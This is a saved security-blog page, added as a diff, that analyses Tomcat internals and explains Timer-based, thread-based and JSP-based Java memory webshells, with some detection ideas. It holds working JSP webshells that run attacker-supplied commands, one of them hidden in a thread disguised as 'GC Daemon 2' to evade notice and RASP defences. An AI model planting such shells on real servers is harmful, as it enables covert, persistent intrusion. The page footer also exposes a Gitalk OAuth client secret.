@@ -1,0 +1,605 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>JavaWeb 内存马二周目通关攻略 | 素十八</title>
+<meta name="description" content="你救赎的人 终将成为你的光" />
+<link rel="shortcut icon" href="https://su18.org/favicon.ico?v=1749017091939">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://su18.org/styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-154954923-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-154954923-1');
+</script>
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://su18.org">
+  <img class="avatar" src="https://su18.org/images/avatar.png?v=1749017091939" alt="">
+  </a>
+  <h1 class="site-title">
+    素十八
+  </h1>
+  <p class="site-description">
+    你救赎的人 终将成为你的光
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="http://javasec.org" class="menu" target="_blank">
+          Javasec
+        </a>
+      
+    
+      
+        <a href="https://www.downly.cn/" class="menu" target="_blank">
+          Downly
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/su18" target="_blank">
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/K_MnO4_" target="_blank">
+          <i class="fab fa-twitter"></i>
+        </a>
+      
+    
+      
+        <a href="https://weibo.com/u/1945525883" target="_blank">
+          <i class="fab fa-weibo"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              JavaWeb 内存马二周目通关攻略
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-10-31
+              </span>
+              <span>
+                19 min read
+              </span>
+              
+                <a href="https://su18.org/tag/TMMOORyTW/" class="post-tag">
+                  # javasec
+                </a>
+              
+                <a href="https://su18.org/tag/NvsPvSxv1i/" class="post-tag">
+                  # shell
+                </a>
+              
+                <a href="https://su18.org/tag/zqdEkvec9F/" class="post-tag">
+                  # 内存马
+                </a>
+              
+                <a href="https://su18.org/tag/V0FeVGMWY/" class="post-tag">
+                  # 漏洞原理
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://su18.org/post-images/memory-shell-2.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>最近状态不好，没研究什么新东西，吃老本水文一篇。</p>
+<p>在之前的文章<a href="https://su18.org/post/memory-shell/">《JavaWeb 内存马一周目通关攻略》</a>中，总结了一些目前行业主流的内存马的实现方式，目前对于内存马的研究和讨论，在国内确实比较火，经常能看见各种各样的文章，在国外讨论的较少，因为歪果仁的日站习惯并不是webshell，而通常是reverse shell。</p>
+<p>所以可以说算是某种程度上的行业领先了，在内存马技术快速迭代的同时，防御技术也要跟上，目前来讲，使用 java agent 技术结合多维度的防御、检测、扫描内存马的方式依旧是最好的方式，我因为是参与了商业化的 RASP 安全产品，也是可以做到主流内存马的检出和防御，关于《一周目》中的内存马类型，实际上还有很多攻与防的思路可以扩展，但由于商业性原因将不再进行讨论。</p>
+<p>随着文章的发布，我还开源了一款非常基础的内存马查杀工具 <a href="https://github.com/su18/MemoryShell">SuAgent</a>，用来对不同类型的内存马进行扫描和防御。</p>
+<p>其实这里留下了伏笔，之前的文章我取名“一周目”，那就意味着将会有二周目、三周目，乃至更多。</p>
+<p>这里由于看到了<a href="https://xz.aliyun.com/u/4830">藏青</a>师傅在先知上发表的<a href="https://xz.aliyun.com/t/10372">JSP内存马研究</a>，实际上跟我本来想在二周目中写的一些技术思想稍有重叠，所以这里就开始二周目的编写。</p>
+<p>在本篇文章可能会引用到《一周目》中的一些技术和思想，如果还没看过之前的文章，建议先看前文，把前面提到的内存马原理了解一下，再看本文。</p>
+<p>本文共提到了几种新的内存马实现方式：Timer 型内存马及其延伸——线程型内存马，以及JSP内存马。</p>
+<h1 id="切入点新思路">切入点：新思路</h1>
+<p>二周目的思路，起源于园长的一篇文章<a href="https://www.javaweb.org/?p=544">Java Timer 后门</a>，这是一篇在2014年就已经发布的文章，文章包含了一个 jsp 后门，这个 jsp 创建了一个 Timer 计时器对象，然后使用 <code>schedule</code> 方法创建了一个 TimerTask 对象，也就是说创建了一个定时任务，每隔 1000 ms，就执行一次 <code>java.util.TimerTask#run</code> 方法里面的逻辑。</p>
+<p>也就是说，在访问了一次这个 jsp 后，会启动一个计时器进行无限循环，一次执行直到服务器重启。<font color="red">即使将这个 jsp 删除，依旧是会继续进行这个任务。</font></p>
+<p>什么？删除 JSP 文件，任务还能执行？这不就没有文件落地了吗？这不就是内存马吗？？？内存马的思想在 2014 年就出现了？？？</p>
+<p>暴风疑问后，有几个思考随之而来：</p>
+<ol>
+<li>既然是 jsp，我们知道 jsp 的本质就是 servlet，那这还是之前提到的 Servlet 型内存马吗？</li>
+<li>为什么 jsp 删掉了，任务还会继续运行？</li>
+<li>这种定时任务，能否做到像之前的 Servlet 型内存马一样，在每次请求时拿到入参，执行结果并返回？</li>
+</ol>
+<p>带着这几个问题，开始研究和学习。</p>
+<h1 id="timer-型内存马">Timer 型内存马</h1>
+<p>首先根据使用的关键类，我将其命名为 Timer 型内存马，首先简单改了一下园长的代码，用于测试：创建 Timer 及 TimerTask，每隔 10 秒钟弹一次计算器。</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%
+  out.println(&quot;timer jsp shell&quot;);
+  java.util.Timer executeSchedule = new java.util.Timer();
+  executeSchedule.schedule(new java.util.TimerTask() {
+    public void run() {
+      try {
+        Runtime.getRuntime().exec(&quot;open -a Calculator.app&quot;);
+      } catch (IOException e) {
+        e.printStackTrace();
+      }
+    }
+  }, 0, 10000);
+%&gt;
+</code></pre>
+<p>按照之前说的流程，启动并访问，页面显示内容，并开始弹出计算器。</p>
+<figure data-type="image" tabindex="1"><img src="https://su18.org/post-images/1635429508736.png" alt="" loading="lazy"></figure>
+<p>此时我们删掉这个 jsp，再次访问，页面已经消失，程序会返回 404 状态码。</p>
+<figure data-type="image" tabindex="2"><img src="https://su18.org/post-images/1635430564815.png" alt="" loading="lazy"></figure>
+<p>但是计算器却依旧在不停的弹，在 Idea Debugger 的 Threads 中也可以看到我们创建的 Timer 线程。</p>
+<figure data-type="image" tabindex="3"><img src="https://su18.org/post-images/1635430707601.png" alt="" loading="lazy"></figure>
+<p>这就验证了之前描述的流程，接下来开始探究之前的思考。</p>
+<h2 id="jsp-与-servlet">jsp 与 servlet</h2>
+<p>这里依旧以 Tomcat 为例，按照 Servlet 的特点，一个 Servlet 在注册时会被封装成 <code>org.apache.catalina.core.StandardWrapper</code>，在其 mappings 中添加类名，并将访问路径及类名的映射关系存储在 <code>org.apache.catalina.core.StandardContext#servletMappings</code> 中。</p>
+<p>而 jsp 的本质，就是 servlet，只不过由 Tomcat 实现了动态转换、编译、加载、执行的过程，这部分在<a href="https://zhishihezi.net/endpoint/richtext/76290e1cf5ea224079c2e19ef2984523?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94ff4b00cae4f0929698ff6c34698e87aeee34b10fef95bc90d0f41e990f8f596cdccb73f70aa70275eec7464f1f42b62d5d5df23dac8a101097dece0c23136ecd6dc2d0d908c40a2ecb8fe2f725e940eaae71bf3ad5567a93be4d4f65e88d29bf72175bc887a174361bd0de59a8e69895b71b5e2041817c3776f529a75da5bce8235ecb9b5e91d6a0692f19ccb65a25a9d#11">Javasec 的 ClassLoader 一章</a>有简单的描述和实现，有兴趣的读者可以先看此文。</p>
+<p>而通过查看 StandardContext 的 servletMappings，我们发现，加载后的 jsp 文件并不在这里，这里只是将 <code>*.jsp/*.jspx</code> 都映射到了一个关键字 &quot;jsp&quot; 上。</p>
+<figure data-type="image" tabindex="4"><img src="https://su18.org/post-images/1635432464365.png" alt="" loading="lazy"></figure>
+<p>这部分实际上是由 Tomcat 配置文件中的 <code>web.xml</code> 所配置的，配置了处理 jsp 的类为 <code>org.apache.jasper.servlet.JspServlet</code> 类。</p>
+<figure data-type="image" tabindex="5"><img src="https://su18.org/post-images/1635433126040.png" alt="" loading="lazy"></figure>
+<p>并为其映射了访问路径为 <code>*.jsp/*.jspx</code> 的文件。</p>
+<figure data-type="image" tabindex="6"><img src="https://su18.org/post-images/1635433205364.png" alt="" loading="lazy"></figure>
+<p>接下来看下 JspServlet 的处理逻辑，总体来说分为三步:</p>
+<ol>
+<li>JSP 引擎将 <code>.jsp</code> 文件翻译成一个 servlet 源代码;</li>
+<li>将 servlet 源代码编译成 <code>.class</code> 文件;</li>
+<li>加载并执行这个编译后的文件。</li>
+</ol>
+<p>而这一整套流程，实际上就是 Tomcat 为 JSP 的处理单独建立了一套与普通 Servlet 类似的 Servlet/Context/Wrapper 的体系:</p>
+<ul>
+<li><code>org.apache.jasper.compiler.JspRuntimeContext</code>：JSP 引擎上下文</li>
+<li><code>org.apache.jasper.servlet.JspServletWrapper</code>：编译后 jsp 的封装类</li>
+</ul>
+<p>而 JspRuntimeContext 中则会存放访问路径和 wrapper 的映射。</p>
+<figure data-type="image" tabindex="7"><img src="https://su18.org/post-images/1635469557760.png" alt="" loading="lazy"></figure>
+<p>这个流程我们是很熟悉的，这里通过跟源代码简单分析一下 Tomcat 的处理流程：</p>
+<p>JspServlet 类的 service 方法用来处理 JSP 请求：</p>
+<figure data-type="image" tabindex="8"><img src="https://su18.org/post-images/1635471280673.png" alt="" loading="lazy"></figure>
+<p>核心方法为 <code>serviceJspFile</code> 方法，在 context 中获取 wrapper，如果没有，先判断文件还在不在，如果在就创建，否则就调用 <code>handleMissingResource</code> 方法处理请求，然后调用 wrapper 的 <code>service</code> 方法处理，同时也 catch 了 FileNotFoundException 异常。</p>
+<figure data-type="image" tabindex="9"><img src="https://su18.org/post-images/1635471508317.png" alt="" loading="lazy"></figure>
+<p>创建 JspServletWrapper 时，同时创建了 JspCompilationContext 类用于将 jsp 编译成 class 文件，用于后续加载。</p>
+<p>JspServletWrapper 的 <code>service</code> 方法在判断了一些标识位后，判断是否是首次访问，是否需要对 jsp 进行编译，如需要则会调用 <code>JspCompilationContext#compile</code> 方法来对 jsp 进行编译，实际上是使用 <code>org.apache.jasper.compiler.JDTCompiler</code> 来进行相关的处理，编译后的 <code>.java</code> 和 <code>.class</code> 文件会存放在 Tomcat 的 work 目录下。</p>
+<figure data-type="image" tabindex="10"><img src="https://su18.org/post-images/1635476479487.png" alt="" loading="lazy"></figure>
+<p>调用 <code>getServlet()</code> 获取访问的 jsp 生成的 servlet 类实例。后续会调用 servlet 实例的 <code>service</code> 方法。</p>
+<figure data-type="image" tabindex="11"><img src="https://su18.org/post-images/1635472529590.png" alt="" loading="lazy"></figure>
+<p><code>getServlet()</code> 方法又判断了页面是否有修改，如果修改则需要进行 reload，会先调用 destroy 方法销毁之前的类实例，再进行重新加载。加载是使用了 InstanceManager 调用 <code>org.apache.jasper.servlet.JasperLoader</code> 来进行 loadClass。</p>
+<figure data-type="image" tabindex="12"><img src="https://su18.org/post-images/1635473140554.png" alt="" loading="lazy"></figure>
+<p><code>destory</code> 方法会调用 servlet 实例的 <code>destory</code> 方法，并使用 InstanceManager 的 <code>destroyInstance</code> 的方法销毁这个实例。</p>
+<figure data-type="image" tabindex="13"><img src="https://su18.org/post-images/1635473308307.png" alt="" loading="lazy"></figure>
+<p>到此位置，对于访问一个 JSP 时 Tomcat 的处理流程的简单分析就结束了，那如果在 Tomcat 运行时，将 JSP 删除再访问，会怎么样呢？</p>
+<p>事实上，Tomcat 不会去监听文件的变化，而是在下一次访问时再进行处理：</p>
+<ol>
+<li>在 <code>JspCompilationContext#compile</code> 方法中，会调用 <code>this.jspCompiler.isOutDated()</code> 判断文件状态；</li>
+<li>方法根据 <code>JspCompilationContext#getLastModified</code> 方法判断 JSP 本地 resource 是否存在，如果不存在，则通过将 <code>JspCompilationContext#removed</code> 标识为 true 来代表了文件已经被移除；</li>
+<li>调用 <code>JspRuntimeContext#removeWrapper</code> 从 <code>JspRuntimeContext#jsps</code> 中移除访问路径与 wrapper 的映射；</li>
+<li>随后会抛出 FileNotFoundException 异常，终止后续的处理逻辑。</li>
+<li>被移除的 wrapper 因为失去了引用，将会被等待 GC。</li>
+</ol>
+<p>以上就是一个 jsp 的生命周期，现在目光回到 Timer 内存马上，按理说，JSP 被删除后，对应的访问映射不存在了，实际执行的 servlet 实例和 wrapper 对象失去了引用将会等待销毁，被销毁后，里面的代码自然就失效了。</p>
+<p>但是由于在恶意代码创建了 Timer 定时任务，而 Timer 会创建一个定时任务线程 TimerThread，Timer 的特性是，如果不是所有未完成的任务都已完成执行，或不调用 Timer 对象的<code> cancel</code> 方法，这个线程是不会停止，也不会被 GC 的，因此，这个任务会一直执行下去，直到应用关闭。</p>
+<h2 id="实现">实现</h2>
+<p>在经历了以上调试后，再来回答开始思考的三个问题。</p>
+<blockquote>
+<p>既然是 jsp，我们知道 jsp 的本质就是 servlet，那这还是之前提到的 Servlet 型内存马吗？</p>
+</blockquote>
+<p>答：内存驻留的原因不是 servlet ，跟 servlet 关系不大，因此不是 servlet 型内存马。</p>
+<blockquote>
+<p>为什么 jsp 删掉了，任务还会继续运行？</p>
+</blockquote>
+<p>答：由 Timer 创建的线程在任务没有自然执行完毕，或没有调用结束时，是不会被 GC 的。</p>
+<blockquote>
+<p>这种定时任务，能否做到像之前的 Servlet 型内存马一样，在每次请求时拿到入参，执行结果并返回？</p>
+</blockquote>
+<p>答：男人，不能说不行。</p>
+<p>这样就出现了新问题：怎么能利用 Timer，实现成 Servlet 型内存马一样的交互呢？</p>
+<p>这里既然是线程，就立刻想到了利用线程中获取 request 回显的思路：创建定时任务，每隔一秒在线程中循环遍历 request，找到带有特定 header 的 request 对象，获取 header 参数并执行命令。</p>
+<p>废话不多说，直接上 jsp。</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.util.List&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;java.util.HashSet&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+    public static List&lt;Object&gt; getRequest() {
+        try {
+            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;));
+
+            for (Thread thread : threads) {
+                if (thread != null) {
+                    String threadName = thread.getName();
+                    if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;http&quot;)) {
+                        Object target = getField(thread, &quot;target&quot;);
+                        if (target instanceof Runnable) {
+                            try {
+                                target = getField(getField(getField(target, &quot;this$0&quot;), &quot;handler&quot;), &quot;global&quot;);
+                            } catch (Exception var11) {
+                                continue;
+                            }
+
+                            List processors = (List) getField(target, &quot;processors&quot;);
+
+                            for (Object processor : processors) {
+                                target = getField(processor, &quot;req&quot;);
+
+                                threadName = (String) target.getClass().getMethod(&quot;getHeader&quot;, String.class).invoke(target, new String(&quot;su18&quot;));
+                                if (threadName != null &amp;&amp; !threadName.isEmpty()) {
+
+                                    Object       note = target.getClass().getDeclaredMethod(&quot;getNote&quot;, int.class).invoke(target, 1);
+                                    Object       req  = note.getClass().getDeclaredMethod(&quot;getRequest&quot;).invoke(note);
+                                    List&lt;Object&gt; list = new ArrayList&lt;Object&gt;();
+                                    list.add(req);
+                                    list.add(threadName);
+                                    return list;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {
+        }
+
+        return new ArrayList&lt;Object&gt;();
+    }
+
+    private static Object getField(Object object, String fieldName) throws Exception {
+        Field field = null;
+        Class clazz = object.getClass();
+
+        while (clazz != Object.class) {
+            try {
+                field = clazz.getDeclaredField(fieldName);
+                break;
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+
+        if (field == null) {
+            throw new NoSuchFieldException(fieldName);
+        } else {
+            field.setAccessible(true);
+            return field.get(object);
+        }
+    }
+%&gt;
+&lt;%
+    final HashSet&lt;Object&gt; set = new HashSet&lt;Object&gt;();
+    java.util.Timer executeSchedule = new java.util.Timer();
+    executeSchedule.schedule(new java.util.TimerTask() {
+        public void run() {
+            List&lt;Object&gt; list = getRequest();
+            if (list.size() == 2) {
+                if (!set.contains(list.get(0))) {
+                    set.add(list.get(0));
+                    try {
+                        Runtime.getRuntime().exec(list.get(1).toString());
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+        }
+    }, 0, 100);
+%&gt;
+</code></pre>
+<p>涉及思路和细节请自行查看和调试，最终效果：</p>
+<figure data-type="image" tabindex="14"><img src="https://su18.org/post-images/1635500407007.png" alt="" loading="lazy"></figure>
+<p>这只是 JSP 实例，可以结合其他基础洞如反序列化等进行尝试。</p>
+<h1 id="延伸线程型内存马">延伸：线程型内存马</h1>
+<p>根据以上的思考，可以发现，所谓的 Timer 型内存马，实际上就是<font color="red">想办法在服务器上启动一个永远不会被 GC 的线程，在此线程中定时或循环执行恶意代码，达到内存马的目的</font>。</p>
+<p>在上面的实现中，首先创建了一个独立于请求的线程，由这个线程里的动作用来实现恶意行为，这个线程里的行为不会自然终止，会持续运行直到 JVM 退出。</p>
+<p>这种描述让你想到了什么？没错，就是守护线程。</p>
+<p>新建线程的操作在攻击中有很多好处，其中之一就是可以绕过 RASP 类型的防御手段。这种思路早在我之前发布的 <a href="https://su18.org/post/su18.jsp/">su18.jsp</a> 中有所体现。</p>
+<h2 id="实现-2">实现</h2>
+<p>所以上面的 Timer 型内存马的关键代码可以修改为如下代码：</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.util.List&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;java.util.HashSet&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;%!
+    public static List&lt;Object&gt; getRequest() {
+        // 与之前一致
+    }
+
+    private static Object getField(Object object, String fieldName) throws Exception {
+       // 与之前一致
+    }
+
+    private static ThreadGroup getSystemThreadGroup() {
+        ThreadGroup group = Thread.currentThread().getThreadGroup();
+        while (!group.getName().equals(&quot;system&quot;)) {
+            group = group.getParent();
+        }
+        return group;
+    }
+%&gt;
+&lt;%
+    final HashSet set = new HashSet();
+
+    // 新建线程，加入到 system 线程组中
+    Thread d = new Thread(getSystemThreadGroup(), new Runnable() {
+        public void run() {
+
+            // 死循环
+            while (true) {
+                try {
+                    // 恶意逻辑
+                    List&lt;Object&gt; list = getRequest();
+                    if (list.size() == 2) {
+                        if (!set.contains(list.get(0))) {
+                            set.add(list.get(0));
+                            try {
+                                Runtime.getRuntime().exec(list.get(1).toString());
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                        }
+                    }
+
+                    // while true + sleep ，相当于 Timer 定时任务
+                    Thread.sleep(100);
+                } catch (Exception ignored) {
+                }
+            }
+        }
+        // 给线程起名叫 GC Daemon 2，没人会注意吧~
+    }, &quot;GC Daemon 2&quot;, 0);
+
+    // 设为守护线程
+    d.setDaemon(true);
+    d.start();
+%&gt;
+</code></pre>
+<p>可以看到，我这里是创建了一个守护线程，命名为 &quot;GC Daemon 2&quot;，然后把它直接放在了 system 线程组中，用来隐蔽自己。线程中是跟 Timer 型内存马一样的循环执行 request 中带入的命令的逻辑。</p>
+<p>创建线程、定时任务的方式还有很多种，请自行发散。</p>
+<h2 id="查杀">查杀</h2>
+<p>那对于线程型内存马，该如何进行查杀呢？</p>
+<p>这里我提供一种非常简单的查杀方式，可以通过购买 RASP 安全产品<font color="red">灵蜥</font>来解决。QAQ</p>
+<h1 id="jsp型内存马">JSP型内存马</h1>
+<p>在上述 Timer 内存马的分析流程中，涉及到了 JSP 的处理流程。虽然现在知道 Timer 型内存马本身跟 JSP 没太大关系，但是还是发现了可以实现类似 Servlet-API 型内存马的新方式——也就是JSP型内存马。</p>
+<p>之前提到，编译、实例化的 JSP 文件，会被 JspServletWrapper 封装，然后将其与访问路径的映射存放在 JspRuntimeContext 中。在访问这个 jsp 的路径时，会判断文件是否删除、是否更改、是否需要重新编译等等判断信息进行相关的处理，处理之后调用 JspServletWrapper 中封装的 JSP 编译之后生成的 Servlet 执行具体逻辑。</p>
+<p>因此与之前我们讨论的 Servlet 型内存马类似，我们可以自己创建对应的类放在相应的位置。此处的重点在于如何绕过访问时的对于 JSP 状态一些判断。</p>
+<p>在藏青师傅的<a href="https://xz.aliyun.com/t/10372">文章</a>中，提到了两种绕过的方式：</p>
+<ul>
+<li>使 <code>options.getDevelopment()</code> 返回 false，这样 Tomcat 就不会动态重新编译 jsp 了；</li>
+<li>使 <code>jspCompiler.isOutDated()</code> 返回 false，标识 jsp 没有修改，无需重新加载和编译，这个思路由鲸落师傅发表在安全客的<a href="https://www.anquanke.com/post/id/224698">这篇文章</a>上。</li>
+</ul>
+<h2 id="实现-3">实现</h2>
+<p>两位师傅针对两种绕过思路给出了各自的实现，以及自删除的实现，例如如下代码，可执行命令，并且即使删除 jsp 文件，也依旧可以执行。</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.mapper.MappingData&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;
+&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.jasper.EmbeddedServletOptions&quot; %&gt;
+&lt;%
+    Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
+    InputStream in = process.getInputStream();
+    int a = 0;
+    byte[] b = new byte[1024];
+
+    while ((a = in.read(b)) != -1) {
+        out.println(new String(b, 0, a));
+    }
+
+    in.close();
+
+    //从request对象中获取request属性
+    Field requestF = request.getClass().getDeclaredField(&quot;request&quot;);
+    requestF.setAccessible(true);
+    Request req = (Request) requestF.get(request);
+    //获取MappingData
+    MappingData mappingData = req.getMappingData();
+    //获取Wrapper
+    Field wrapperF = mappingData.getClass().getDeclaredField(&quot;wrapper&quot;);
+    wrapperF.setAccessible(true);
+    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
+    //获取jspServlet对象
+    Field instanceF = wrapper.getClass().getDeclaredField(&quot;instance&quot;);
+    instanceF.setAccessible(true);
+    Servlet jspServlet = (Servlet) instanceF.get(wrapper);
+    //获取options中保存的对象
+    Field Option = jspServlet.getClass().getDeclaredField(&quot;options&quot;);
+    Option.setAccessible(true);
+    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);
+    //设置development属性为false
+    Field Developent = op.getClass().getDeclaredField(&quot;development&quot;);
+    Developent.setAccessible(true);
+    Developent.set(op, false);
+%&gt;
+</code></pre>
+<h2 id="查杀-2">查杀</h2>
+<p>JSP型内存马的本质，是 Servlet，只要是 Servlet 型内存马，基本可以使用 SuAgent 来进行初步的检测，但有所不同的是，对于先创建再删除的 jsp，虽然 jsp 已经被删除，但是动态创建的 <code>.java</code> 以及 <code>.class</code> 文件没被删除。</p>
+<p>在没被删除的情况下，内存中对应的 servlet class 其实是有文件落地的，因此可以绕过包括 <a href="https://github.com/su18/MemoryShell">SuAgent</a> 在内的一些查杀手段。</p>
+<p>虽然先创建再删除这个过程违背了内存马的初衷，但这也算是实战中能够遇到的一种情况，需要考虑。</p>
+<p>那么该如何彻底查杀JSP型内存马呢？</p>
+<p>其实也很好理解，如果一个 jsp 路径可以访问，或对应的 class 文件存在，但是 jsp 本身不存在，就可能会出现风险。</p>
+<p>根据以上思路，我们可以通过拿到系统中全部的 Servlet 类实例之后，判断这是否是一个 jsp 编译的类，再通过 ClassLoader、Context 等反推 jsp 文件位置，使用 <code>File.exists()</code> 判断源 jsp 文件是否存在。</p>
+<p>基于这种思路，我简单实现了JSP型内存马的查杀，截图如下：</p>
+<figure data-type="image" tabindex="15"><img src="https://su18.org/post-images/1635665637537.png" alt="" loading="lazy"></figure>
+<p>但实际上，这种查杀思路在很多实际场景下是不生效的，因此还需要找到其他的查杀方式：非常简单，可以通过购买 RASP 安全产品<font color="red">灵蜥</font>来解决。</p>
+<h1 id="总结">总结</h1>
+<p>本篇文章总结了两种在 《一周目》中没有涉及的内存马实现思路：</p>
+<ul>
+<li>线程型内存马：想办法在服务器上启动一个永远不会被 GC 的线程，在此线程中定时或循环执行恶意代码，达到内存马的目的。</li>
+<li>JSP型内存马：利用绕过 JSP 删除后再次访问时触发的回收机制，来让 JSP 编译后的类驻留在内存中，即使删除 JSP 文件后依旧可以访问，达到内存马的目的。</li>
+</ul>
+<p>并根据以上的分析给出实现和查杀思路。对于线程型内存马，目前我给出的实现方式并不优雅，但也足够了，旨在抛砖引玉，希望各位师傅们提出更多的思路及想法。</p>
+<p>对于以上两种类型内存马的查杀代码，可能等到再完善和测试一段时间后，会更新到我关于内存马的<a href="https://github.com/su18/MemoryShell">项目</a>中，敬请期待一下。</p>
+<h1 id="引用">引用</h1>
+<p><a href="https://xz.aliyun.com/t/10372">https://xz.aliyun.com/t/10372</a></p>
+<p><a href="https://www.anquanke.com/post/id/224698">https://www.anquanke.com/post/id/224698</a></p>
+<p><a href="https://javasec.org">https://javasec.org</a></p>
+<p><a href="https://www.javaweb.org/">https://www.javaweb.org/</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%88%87%E5%85%A5%E7%82%B9%E6%96%B0%E6%80%9D%E8%B7%AF">切入点：新思路</a></li>
+<li><a href="#timer-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Timer 型内存马</a>
+<ul>
+<li><a href="#jsp-%E4%B8%8E-servlet">jsp 与 servlet</a></li>
+<li><a href="#%E5%AE%9E%E7%8E%B0">实现</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BB%B6%E4%BC%B8%E7%BA%BF%E7%A8%8B%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">延伸：线程型内存马</a>
+<ul>
+<li><a href="#%E5%AE%9E%E7%8E%B0-2">实现</a></li>
+<li><a href="#%E6%9F%A5%E6%9D%80">查杀</a></li>
+</ul>
+</li>
+<li><a href="#jsp%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">JSP型内存马</a>
+<ul>
+<li><a href="#%E5%AE%9E%E7%8E%B0-3">实现</a></li>
+<li><a href="#%E6%9F%A5%E6%9D%80-2">查杀</a></li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E5%BC%95%E7%94%A8">引用</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://su18.org/post/rmi-attack/">
+              <h3 class="post-title">
+                 Java RMI 攻击由浅入深
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '21ee097e0f08e9b76b4b',
+    clientSecret: 'bda6c4a0d4dc3f275da2e82d2d59b683274ff195',
+    repo: 'blogtalk',
+    owner: 'su18',
+    admin: ['su18'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  友情链接：<a href="https://www.yzmm.net/" target="_blank">园长</a> <a href="https://www.cnblogs.com/H4ck3R-XiX/" target="_blank">赵公子</a> <a href="https://fynch3r.github.io" target="_blank">fynch3r</a> <a href="https://g1asssy.com/" target="_blank">Glassy@Amadeus</a> <a href="https://iswin.org/" target="_blank">随风</a>  <a href="https://www.9170.org/" target="_blank">健宇</a>  <a href="https://fuzz7j.github.io/" target="_blank">fuzz7j</a>  <a href="https://blog.zgsec.cn/" target="_blank">曾哥</a> | 
+  <a class="rss" href="https://su18.org/atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
